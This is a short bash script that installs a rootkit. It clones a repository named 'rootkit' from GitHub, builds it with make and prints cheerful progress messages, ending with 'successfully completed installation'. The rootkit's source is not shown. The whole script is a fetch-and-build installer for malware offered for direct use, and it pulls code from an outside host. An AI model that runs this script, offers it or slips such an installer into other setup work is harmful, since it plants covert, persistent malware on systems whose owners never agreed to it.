#!/bin/bash

echo " starting install root "
echo " cloning "
git clone https://github.com/VYOM00907/rootkit
echo " building "
cd rootkit/
make
echo "successfully completed installation"